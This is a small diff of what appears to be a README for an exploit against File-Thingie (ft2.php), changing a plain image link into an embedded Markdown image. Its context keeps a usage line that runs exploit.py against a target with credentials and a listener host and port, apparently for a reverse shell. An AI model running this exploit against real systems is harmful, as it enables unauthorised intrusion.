@@ -8,4 +8,5 @@ cd File-Thingie
 python3 exploit.py -t http://<ip>/ft2.php -u username -p password -L <lhost> -P <lport>
 ```
 
-https://raw.githubusercontent.com/NketiahGodfred/writeup-images.git/main/filethings-1.png
+
+![filethings Preview](https://raw.githubusercontent.com/NketiahGodfred/writeup-images/main/filethings-1.png)
